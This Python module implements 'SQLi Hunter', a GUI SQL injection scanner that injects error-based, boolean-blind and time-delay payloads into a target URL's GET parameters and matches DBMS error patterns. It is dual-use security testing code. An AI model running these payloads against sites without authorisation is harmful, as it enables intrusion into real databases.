# =============================================================================
# modules/sqli.py
#
# SQLi Hunter - Native Python SQL Injection Discovery Engine
# Independent of SQLMap - Uses customized testing logic
# =============================================================================

import re

try:
    import requests
except ImportError:
    pass
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed

from PySide6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QGridLayout, 
    QTableWidget, QTableWidgetItem, QHeaderView, QTextEdit
)
from PySide6.QtCore import Qt, QObject, Signal, QThread

from modules.bases import ToolBase, ToolCategory
from ui.worker import ToolExecutionMixin
from ui.styles import (
    RunButton, StopButton, StyledLineEdit, StyledComboBox, StyledSpinBox,
    StyledLabel, HeaderLabel, StyledGroupBox, OutputView,
    ToolSplitter, StyledToolView, COLOR_SUCCESS, COLOR_ERROR, COLOR_WARNING
)

# --- PAYLOAD DATABASE ---
PAYLOADS = {
    'error': [
        "'", '"', "\\", "')", '")', 
        "' OR '1'='1", '" OR "1"="1', 
        "' OR 1=1 --", '" OR 1=1 --'
    ],
    'boolean': [
        {'true': ' AND 1=1', 'false': ' AND 1=2'},
        {'true': "' AND '1'='1", 'false': "' AND '1'='2"},
        {'true': '" AND "1"="1', 'false': '" AND "1"="2'}
    ],
    'time': [
        {'payload': ' SLEEP(5) --', 'db': 'MySQL'},
        {'payload': "'; WAITFOR DELAY '0:0:5' --", 'db': 'MSSQL'},
        {'payload': "'; SELECT pg_sleep(5); --", 'db': 'PostgreSQL'}
    ]
}

DBMS_ERRORS = {
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
    "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\."),
    "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
    "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
    "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
    "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
}

class SQLiTool(ToolBase):
    name = "SQLi Hunter"
    category = ToolCategory.WEB_INJECTION
    
    @property
    def icon(self) -> str:
        return "💉"
    
    def get_widget(self, main_window):
        return SQLiView(main_window=main_window)


class SQLiWorker(QObject):
    log = Signal(str)
    result = Signal(dict)
    finished = Signal()
    progress = Signal(int, int)

    def __init__(self, target_url, method, data, cookies, concurrency):
        super().__init__()
        self.target_url = target_url
        self.method = method
        self.data = data # For POST headers/body
        self.cookies = cookies
        self.concurrency = concurrency
        self.is_running = True
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'VAJRA-SQLi-Hunter/1.0'})

    def run(self):
        self.log.emit(f"[*] Initializing native engine...")
        
        # 1. Parse URL/Parameters
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        
        if not params and self.method == 'GET':
            self.log.emit(f"<span style='color:{COLOR_WARNING}'>[-] No GET parameters found to test.</span>")
            self.finished.emit()
            return

        self.log.emit(f"[*] Found {len(params)} parameters: {', '.join(params.keys())}")
        
        # 2. Establish Baseline
        self.log.emit("[*] Requesting baseline...")
        try:
            baseline_resp = self._send(self.target_url)
            baseline_len = len(baseline_resp.text)
            self.log.emit(f"[+] Baseline length: {baseline_len} bytes")
        except Exception as e:
            self.log.emit(f"<span style='color:{COLOR_ERROR}'>[-] Connection Failed: {e}</span>")
            self.finished.emit()
            return

        # 3. Fuzzing Loop
        total_tests = len(params) * (len(PAYLOADS['error']) + len(PAYLOADS['boolean']) + len(PAYLOADS['time']))
        tests_done = 0
        
        # We process parameters sequentially to avoid WAF banning/noise, 
        # but payloads for a param can be threaded if we were aggressive. 
        # For stability, we stick to a robust simple loop or small thread pool.
        
        for param, values in params.items():
            if not self.is_running: break
            
            orig_val = values[0]
            self.log.emit(f"<br><b>[*] Testing parameter: {param}</b>")
            
            # --- A. Error-Based Testing ---
            for payload in PAYLOADS['error']:
                if not self.is_running: break
                
                # Inject
                fuzzed_url = self._inject_get(parsed, params, param, orig_val + payload)
                try:
                    resp = self._send(fuzzed_url)
                    
                    # Check regexes
                    for db, regexes in DBMS_ERRORS.items():
                        for reg in regexes:
                            if re.search(reg, resp.text, re.I):
                                self.result.emit({
                                    "param": param,
                                    "type": "Error-Based",
                                    "payload": payload,
                                    "details": f"Database: {db}"
                                })
                                self.log.emit(f"<span style='color:{COLOR_SUCCESS}'>[+] VULNERABLE (Error): {param} - DB: {db}</span>")
                                break
                except: pass
                
                tests_done += 1
                if tests_done % 5 == 0: self.progress.emit(tests_done, total_tests)

            # --- B. Boolean-Based Testing ---
            for check in PAYLOADS['boolean']:
                if not self.is_running: break
                
                # Request True
                url_true = self._inject_get(parsed, params, param, orig_val + check['true'])
                # Request False
                url_false = self._inject_get(parsed, params, param, orig_val + check['false'])
                
                try:
                    resp_true = self._send(url_true)
                    resp_false = self._send(url_false)
                    
                    # Compare
                    # If True resp is similar to Baseline AND False resp is different
                    if self._is_similar(baseline_resp, resp_true) and not self._is_similar(resp_true, resp_false):
                         self.result.emit({
                            "param": param,
                            "type": "Boolean-Blind",
                            "payload": check['true'] + " / " + check['false'],
                            "details": "True/False response deviation"
                        })
                         self.log.emit(f"<span style='color:{COLOR_SUCCESS}'>[+] VULNERABLE (Boolean): {param}</span>")
                except: pass
                
                tests_done += 1

            # --- C. Time-Based Testing ---
            for check in PAYLOADS['time']:
                if not self.is_running: break
                
                url_time = self._inject_get(parsed, params, param, orig_val + check['payload'])
                
                try:
                    start_time = time.time()
                    self._send(url_time)
                    elapsed = time.time() - start_time
                    
                    if elapsed > 4.5: # 5s sleep tolerance
                        self.result.emit({
                            "param": param,
                            "type": "Time-Blind",
                            "payload": check['payload'],
                            "details": f"Delayed {elapsed:.2f}s (DB: {check['db']})"
                        })
                        self.log.emit(f"<span style='color:{COLOR_SUCCESS}'>[+] VULNERABLE (Time): {param} - {elapsed:.2f}s delay</span>")
                except: pass
                
                tests_done += 1

        self.log.emit("<br>[*] Scan completed.")
        self.finished.emit()

    def _inject_get(self, parsed, params, target_param, payload):
        # Construct URL with injected payload
        new_params = params.copy()
        new_params[target_param] = payload
        query = urlencode(new_params, doseq=True)
        return urlunparse(parsed._replace(query=query))

    def _send(self, url):
        return self.session.get(url, timeout=10, verify=False) # Helper for cleaner code

    def _is_similar(self, resp1, resp2, tolerance=0.02):
        # Content length similarity ratio
        l1 = len(resp1.text)
        l2 = len(resp2.text)
        if l1 == 0 and l2 == 0: return True
        ratio = abs(l1 - l2) / max(l1, l2)
        return ratio < tolerance

    def stop(self):
        self.is_running = False


class SQLiView(StyledToolView, ToolExecutionMixin):
    tool_name = "SQLi Hunter"
    tool_category = "WEB_INJECTION"

    def __init__(self, main_window=None):
        super().__init__()
        self.main_window = main_window
        self.workers = set()
        self._build_ui()

    def _build_ui(self):
        main_layout = QVBoxLayout(self)
        main_layout.setContentsMargins(0, 0, 0, 0)
        splitter = ToolSplitter()
        
        # === Left Panel ===
        control_panel = QWidget()
        layout = QVBoxLayout(control_panel)
        
        layout.addWidget(HeaderLabel(self.tool_category, self.tool_name))
        
        # Target
        target_group = StyledGroupBox("🎯 Target")
        t_layout = QGridLayout(target_group)
        self.url_input = StyledLineEdit()
        self.url_input.setPlaceholderText("http://testphp.vulnweb.com/artists.php?artist=1")
        self.method_combo = StyledComboBox()
        self.method_combo.addItems(["GET"]) # POST support coming next
        
        t_layout.addWidget(StyledLabel("URL:"), 0, 0)
        t_layout.addWidget(self.url_input, 0, 1)
        t_layout.addWidget(self.method_combo, 0, 2)
        layout.addWidget(target_group)
        
        # Config
        conf_group = StyledGroupBox("⚙️ Config")
        c_layout = QGridLayout(conf_group)
        self.threads = StyledSpinBox()
        self.threads.setValue(1) # SQLi should be gentle
        self.cookie_input = StyledLineEdit()
        self.cookie_input.setPlaceholderText("PHPSESSID=...")
        
        c_layout.addWidget(StyledLabel("Threads:"), 0, 0)
        c_layout.addWidget(self.threads, 0, 1)
        c_layout.addWidget(StyledLabel("Cookies:"), 1, 0)
        c_layout.addWidget(self.cookie_input, 1, 1)
        layout.addWidget(conf_group)
        
        # Buttons
        btns = QHBoxLayout()
        self.run_btn = RunButton("Start SQLi Scan")
        self.run_btn.clicked.connect(self.run_scan)
        self.stop_btn = StopButton()
        self.stop_btn.clicked.connect(self.stop_scan)
        btns.addWidget(self.run_btn)
        btns.addWidget(self.stop_btn)
        layout.addLayout(btns)
        
        layout.addStretch()
        splitter.addWidget(control_panel)
        
        # === Right Panel ===
        res_panel = QWidget()
        r_layout = QVBoxLayout(res_panel)
        
        self.table = QTableWidget()
        self.table.setColumnCount(4)
        self.table.setHorizontalHeaderLabels(["Param", "Type", "Payload", "Details"])
        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.table.setStyleSheet("gridline-color: #333; color: #ddd;")
        
        self.log_box = OutputView(self.main_window)
        
        r_layout.addWidget(self.table)
        r_layout.addWidget(self.log_box)
        splitter.addWidget(res_panel)
        
        main_layout.addWidget(splitter)
        splitter.setSizes([400, 600])

    def run_scan(self):
        url = self.url_input.text().strip()
        if not url:
            self._error("Target URL required")
            return
            
        self.table.setRowCount(0)
        self.log_box.clear()
        
        self.run_btn.set_loading(True)
        self.stop_btn.setEnabled(True)
        
        self.thread = QThread()
        self.worker = SQLiWorker(
            url, 
            self.method_combo.currentText(),
            None,
            self.cookie_input.text(),
            self.threads.value()
        )
        self.worker.moveToThread(self.thread)
        
        self.thread.started.connect(self.worker.run)
        self.worker.log.connect(self._info) # Log HTML
        self.worker.result.connect(self.add_vuln)
        self.worker.finished.connect(self.thread.quit)
        self.worker.finished.connect(self.worker.deleteLater)
        self.thread.finished.connect(self.on_finished)
        
        self.thread.start()

    def stop_scan(self):
        if hasattr(self, 'worker'):
            self.worker.stop()

    def add_vuln(self, data):
        r = self.table.rowCount()
        self.table.insertRow(r)
        
        # Red text for vulnerability
        c1 = QTableWidgetItem(data['param'])
        c1.setForeground(Qt.red)
        
        self.table.setItem(r, 0, c1)
        self.table.setItem(r, 1, QTableWidgetItem(data['type']))
        self.table.setItem(r, 2, QTableWidgetItem(data['payload']))
        self.table.setItem(r, 3, QTableWidgetItem(data['details']))

    def on_finished(self):
        self.run_btn.set_loading(False)
        self.stop_btn.setEnabled(False)
